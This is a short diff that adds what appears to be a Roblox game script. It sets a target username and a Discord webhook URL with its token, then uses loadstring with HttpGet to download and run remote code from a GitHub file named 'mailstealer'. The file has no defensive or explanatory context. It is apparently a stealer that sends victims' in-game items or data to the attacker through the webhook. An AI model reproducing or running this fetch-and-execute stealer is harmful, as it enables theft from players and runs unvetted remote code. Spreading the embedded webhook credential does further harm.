@@ -1,0 +1,4 @@
+Username= 'EmiRAta4'
+Webhook= 'https://discord.com/api/webhooks/1373743035216564345/rhM9zxkChfqb7bZR3x7QnJFBQMmxHUOma6lP0beYZwWCtXTEQHyu5rY1l62V17lI0oPQ'
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xvkzi/psx/main/mailstealer'))()
